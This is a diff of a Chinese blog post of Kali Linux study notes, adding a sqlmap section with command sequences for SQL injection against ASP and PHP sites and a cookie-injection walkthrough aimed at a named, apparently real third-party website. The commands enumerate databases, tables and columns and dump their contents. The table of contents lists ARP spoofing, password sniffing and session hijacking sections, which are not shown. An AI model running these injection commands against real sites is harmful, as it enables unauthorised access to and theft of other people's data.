@@ -82,14 +82,14 @@
 <meta name="description" content="本文讲述了在完成kali安装后其配置的基础过程。操作系统为kali 2018.1">
 <meta name="keywords" content="kali">
 <meta property="og:type" content="article">
-<meta property="og:title" content="kali的学习">
+<meta property="og:title" content="kali学习笔记">
 <meta property="og:url" content="http://yoursite.com/2018/03/05/8-kali/index.html">
 <meta property="og:site_name" content="JERRY HOME">
 <meta property="og:description" content="本文讲述了在完成kali安装后其配置的基础过程。操作系统为kali 2018.1">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2018-03-06T14:01:11.000Z">
+<meta property="og:updated_time" content="2018-03-09T15:39:47.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="kali的学习">
+<meta name="twitter:title" content="kali学习笔记">
 <meta name="twitter:description" content="本文讲述了在完成kali安装后其配置的基础过程。操作系统为kali 2018.1">
 
 
@@ -126,7 +126,7 @@
 
 
 
-  <title>kali的学习 | JERRY HOME</title>
+  <title>kali学习笔记 | JERRY HOME</title>
   
 
 
@@ -280,7 +280,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">kali的学习</h1>
+          <h1 class="post-title" itemprop="name headline">kali学习笔记</h1>
         
 
         <div class="post-meta">
@@ -396,6 +396,9 @@
 <li>(4)浏览器配置<code>127.0.0.1:1234</code>代理，并访问<code>127.0.0.1:1234</code></li>
 <li>(5)流量经过eth0时，浏览器中adapters中选择eth0,并提交，cookie会实时更新。</li>
 </ul>
+<h3 id="sqlmap工具"><a href="#sqlmap工具" class="headerlink" title="sqlmap工具"></a>sqlmap工具</h3><h4 id="asp网站的渗透"><a href="#asp网站的渗透" class="headerlink" title="asp网站的渗透"></a>asp网站的渗透</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"注入点"</span>             <span class="comment">#检测是否存在注入，如果存在，则返回数据库的名字等信息</span></span><br><span class="line">sqlmap -u <span class="string">"注入点"</span>  --tables   <span class="comment">#猜所有的表名</span></span><br><span class="line">sqlmap -u <span class="string">"注入点"</span>  --columns -T <span class="string">"表名"</span>   <span class="comment">#猜表中的列名</span></span><br><span class="line">sqlmap -u <span class="string">"注入点"</span>  --dump -C <span class="string">"列名1,..."</span> -T <span class="string">"表名"</span>   <span class="comment">#猜列出的列的值，dump表示下载数据</span></span><br></pre></td></tr></table></figure>
+<h4 id="php网站的渗透"><a href="#php网站的渗透" class="headerlink" title="php网站的渗透"></a>php网站的渗透</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"注入点"</span>             <span class="comment">#检测是否存在注入，如果存在，则返回数据库的名字等信息</span></span><br><span class="line">sqlmap -u <span class="string">"注入点"</span>  --is-dba   <span class="comment">#检测是否是dba权限，如果是，那么就可以直接写文件到目录文件夹下</span></span><br><span class="line">sqlmap -u <span class="string">"注入点"</span>  --dbs      <span class="comment">#列出所有的数据库，access是没有的</span></span><br><span class="line">sqlmap -u <span class="string">"注入点"</span>  --current-db     <span class="comment">#查找自己的数据库</span></span><br><span class="line">sqlmap -u <span class="string">"注入点"</span>  --tables -D <span class="string">"数据库名"</span> <span class="comment">#根据数据库名来查询所有表名</span></span><br><span class="line">sqlmap -u <span class="string">"注入点"</span>  --columns -T <span class="string">"表名"</span> -D <span class="string">"数据库名"</span>    <span class="comment">#查询所有的列名</span></span><br><span class="line">sqlmap -u <span class="string">"注入点"</span>  --dump -C <span class="string">"列名1,..."</span> -T <span class="string">"表名"</span> -D <span class="string">"数据库名"</span>  <span class="comment">#查询列的字段</span></span><br></pre></td></tr></table></figure>
+<h4 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h4><p>以<code>http://www.wisefund.com.cn/about.asp?id=56</code>为例<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://www.wisefund.com.cn/about.asp"</span> --cookie <span class="string">"ie=56"</span> --level 2 <span class="comment">#cookie里写ID的参数，如果是cookie注入，需要提升等级为level 2</span></span><br><span class="line">sqlmap -u <span class="string">"http://www.wisefund.com.cn/about.asp"</span> --tables --cookie <span class="string">"ie=56"</span> --level 2 <span class="comment">#猜表名</span></span><br><span class="line">sqlmap -u <span class="string">"http://www.wisefund.com.cn/about.asp"</span> --columns -T <span class="string">"表名"</span> --cookie <span class="string">"ie=56"</span> --level 2   <span class="comment">#猜列名</span></span><br><span class="line">sqlmap -u <span class="string">"http://www.wisefund.com.cn/about.asp"</span> --dump -C <span class="string">"列名1,..."</span> -T <span class="string">"表名"</span> --cookie <span class="string">"ie=56"</span> --level 2 <span class="comment">#猜值</span></span><br></pre></td></tr></table></figure></p>
 
       
     </div>
@@ -572,7 +575,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#更新源"><span class="nav-number">1.</span> <span class="nav-text">更新源</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#安装vmware-tools工具"><span class="nav-number">2.</span> <span class="nav-text">安装vmware tools工具</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#kali美化"><span class="nav-number">3.</span> <span class="nav-text">kali美化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#开启ssh"><span class="nav-number">4.</span> <span class="nav-text">开启ssh</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ARP欺骗"><span class="nav-number">5.</span> <span class="nav-text">ARP欺骗</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#图片捕获"><span class="nav-number">6.</span> <span class="nav-text">图片捕获</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ettercap实现获取http密码"><span class="nav-number">7.</span> <span class="nav-text">ettercap实现获取http密码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ettercap实现获取https密码"><span class="nav-number">8.</span> <span class="nav-text">ettercap实现获取https密码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#会话劫持"><span class="nav-number">9.</span> <span class="nav-text">会话劫持</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#方法1"><span class="nav-number">9.0.1.</span> <span class="nav-text">方法1</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#方法2"><span class="nav-number">9.0.2.</span> <span class="nav-text">方法2</span></a></li></ol></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#更新源"><span class="nav-number">1.</span> <span class="nav-text">更新源</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#安装vmware-tools工具"><span class="nav-number">2.</span> <span class="nav-text">安装vmware tools工具</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#kali美化"><span class="nav-number">3.</span> <span class="nav-text">kali美化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#开启ssh"><span class="nav-number">4.</span> <span class="nav-text">开启ssh</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ARP欺骗"><span class="nav-number">5.</span> <span class="nav-text">ARP欺骗</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#图片捕获"><span class="nav-number">6.</span> <span class="nav-text">图片捕获</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ettercap实现获取http密码"><span class="nav-number">7.</span> <span class="nav-text">ettercap实现获取http密码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ettercap实现获取https密码"><span class="nav-number">8.</span> <span class="nav-text">ettercap实现获取https密码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#会话劫持"><span class="nav-number">9.</span> <span class="nav-text">会话劫持</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#方法1"><span class="nav-number">9.0.1.</span> <span class="nav-text">方法1</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#方法2"><span class="nav-number">9.0.2.</span> <span class="nav-text">方法2</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sqlmap工具"><span class="nav-number">10.</span> <span class="nav-text">sqlmap工具</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#asp网站的渗透"><span class="nav-number">10.1.</span> <span class="nav-text">asp网站的渗透</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#php网站的渗透"><span class="nav-number">10.2.</span> <span class="nav-text">php网站的渗透</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#cookie注入"><span class="nav-number">10.3.</span> <span class="nav-text">cookie注入</span></a></li></ol></li></ol></div>
             
 
           </div>
